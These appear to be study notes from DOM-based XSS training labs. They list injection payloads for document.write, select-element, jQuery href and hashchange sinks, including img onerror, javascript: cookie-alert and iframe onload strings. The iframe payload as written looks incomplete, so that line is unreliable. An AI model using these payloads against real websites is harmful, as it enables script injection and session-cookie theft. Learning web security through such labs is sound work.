## DOM XSS in document.write sink using location.search 
- `document.write` function gets its data from `location.search` 
- if the input is being reflected in some attribute of another HTML tag, then
```HTML
"><img src="" onerror=alert(1)>
```

## DOM XSS in document.write sink using source location.search inside a `select` element
- Inject the payload from the url, as it can take another parameter storeId
- First close the `select` statement and then the malicious HTML
```HTML
"></select><img src="" onerror=alert(1)>
```


## DOM XSS in jQuery anchor href attribute sink location.search source 
- sometimes href links can be modified from URL parameters
- to execute javascript from a link
```
javascript:alert(document.cookie)
```
## DOM XSS in jQuery selector sink using a `hashchange` event
- The vulnerable code:
![](Pasted%20image%2020220204120213.png)
- Through frame 
```
<iframe src='<target-url>' onload="this.src='<img src=x onerror=alert(0)>'"></iframe>
```
**Why this works** 
- so the `hashchange` event is called whenever a # is appended to the URL to load the same page or a section of that page. 
- in the screenshot we can see the `window.location.hash` is getting executed, so if we alter the requests from the server to change the `location.hash` like injecting an `iframe` with a malicious `onload` attribute it's done! we can execute JS code on the website.